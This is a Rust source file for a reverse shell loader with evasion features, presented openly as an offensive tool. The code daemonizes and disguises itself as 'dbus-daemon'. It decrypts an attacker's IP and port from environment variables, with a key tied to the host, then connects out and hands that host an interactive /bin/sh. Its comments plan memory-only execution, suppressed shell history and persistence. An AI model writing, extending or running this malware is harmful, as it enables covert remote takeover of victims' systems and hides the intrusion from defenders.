// Hardened Reverse Shell Loader in Rust
// Runtime-only payload: no hardcoded secrets or IPs
// ToDo: Integrate memfd/pipe with unlink-after-open,
//       add more aggressive memory zeroization,
//       prevent shell history,
//       and implement minimal persistence mechanisms.

use ring::aead::{Aad, LessSafeKey, Nonce, UnboundKey, AES_256_GCM};
use std::env;
use std::ffi::{c_char, CString};
use std::net::{Ipv4Addr, SocketAddr, SocketAddrV4};
use std::os::raw::c_int;
use std::os::unix::io::AsRawFd;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::runtime::Builder;
use tokio::time::sleep;
use libc::{fcntl, fork, setsid, _exit, umask, chdir, close, prctl, F_GETFL, F_SETFL, O_NONBLOCK, execvp, dup2, getuid};
use zeroize::Zeroize;
use base64::{engine::general_purpose, Engine};
use sha2::{Sha256, Digest};
use rand::{rng, RngCore};
use hostname::get as get_hostname;

const PR_SET_NAME: i32 = 15;
const MAX_RETRIES: u32 = 20;

fn main() {
    daemonize();
    set_process_name("dbus-daemon");

    let rt = Builder::new_current_thread()
        .enable_all()
        .build()
        .expect("Tokio runtime failed");
    rt.block_on(async_main());
}

async fn async_main() {
    let aes_key = env::var("AES_KEY").expect("Missing AES_KEY env var");
    let enc_payload_b64 = env::var("ENC_PAYLOAD").expect("Missing ENC_PAYLOAD env var");
    let aad_hex = env::var("ENC_AAD").expect("Missing ENC_AAD env var");
    let iv_hex = env::var("ENC_IV").expect("Missing ENC_IV env var");

    // Hostname + UID
    let hostname = get_hostname().unwrap_or_default().into_string().unwrap_or_default();
    let uid = unsafe { getuid() }.to_string();

    let mut hasher = Sha256::new();
    hasher.update(hostname.as_bytes());
    hasher.update(uid.as_bytes());
    hasher.update(hex::decode(&aes_key).expect("Invalid AES_KEY hex"));
    let mut key_buf = hasher.finalize();

    let iv = hex::decode(&iv_hex).expect("Invalid IV");
    let nonce = Nonce::assume_unique_for_key(<[u8; 12]>::try_from(iv.as_slice()).unwrap());

    let aad = Aad::from(hex::decode(&aad_hex).expect("Invalid AAD"));
    let mut in_out = general_purpose::STANDARD
        .decode(&enc_payload_b64)
        .expect("Invalid Base64 payload");

    let key = LessSafeKey::new(UnboundKey::new(&AES_256_GCM, &key_buf).unwrap());
    let plain_len = in_out.len() - 16;

    match key.open_in_place(nonce, aad, &mut in_out) {
        Ok(_) => {}
        Err(_e) => {
            eprintln!("[-] AES-GCM decryption failed: likely wrong key or env data");
            #[cfg(debug_assertions)]
            eprintln!("    Debug: {:?}", _e);
            key_buf.zeroize();
            in_out.zeroize();
            std::process::exit(1);
        }
    }

    key_buf.zeroize();

    let plain = &in_out[..plain_len];
    let port = u16::from_be_bytes([plain[2], plain[3]]);
    let ip = Ipv4Addr::new(plain[4], plain[5], plain[6], plain[7]);
    let addr = SocketAddr::V4(SocketAddrV4::new(ip, port));
    in_out.zeroize();

    let mut retry_count = 0;
    let mut rng = rng();

    loop {
        if retry_count >= MAX_RETRIES {
            eprintln!("[-] Max retries reached. Exiting.");
            break;
        }

        match TcpStream::connect(addr).await {
            Ok(stream) => {
                let fd: c_int = stream.as_raw_fd();
                unsafe {
                    let flags = fcntl(fd, F_GETFL);
                    if flags != -1 {
                        fcntl(fd, F_SETFL, flags & !O_NONBLOCK);
                    }

                    dup2(fd, 0);
                    dup2(fd, 1);
                    dup2(fd, 2);

                    let path = CString::new("/bin/sh").unwrap();
                    let arg0 = CString::new("sh").unwrap();
                    let arg1 = CString::new("-i").unwrap();
                    let argv: [*const c_char; 3] =
                        [arg0.as_ptr(), arg1.as_ptr(), std::ptr::null()];
                    execvp(path.as_ptr(), argv.as_ptr());

                    eprintln!("execvp failed: {}", std::io::Error::last_os_error());
                    _exit(1);
                }
            }
            Err(e) => {
                retry_count += 1;
                let jitter = 3 + (rng.next_u32() % 5);
                eprintln!("[-] Connect failed ({}). Retrying in {}s...", e, jitter);
                sleep(Duration::from_secs(jitter as u64)).await;
            }
        }
    }
}

fn daemonize() {
    unsafe {
        if fork() != 0 { _exit(0); }
        setsid();
        if fork() != 0 { _exit(0); }
        umask(0);
        chdir(b"/\0".as_ptr() as _);
        for fd in 0..3 { close(fd); }
    }
}

fn set_process_name(name: &str) {
    let c_name = CString::new(name).expect("CString failed");
    unsafe {
        prctl(PR_SET_NAME, c_name.as_ptr() as usize, 0, 0, 0);
    }
}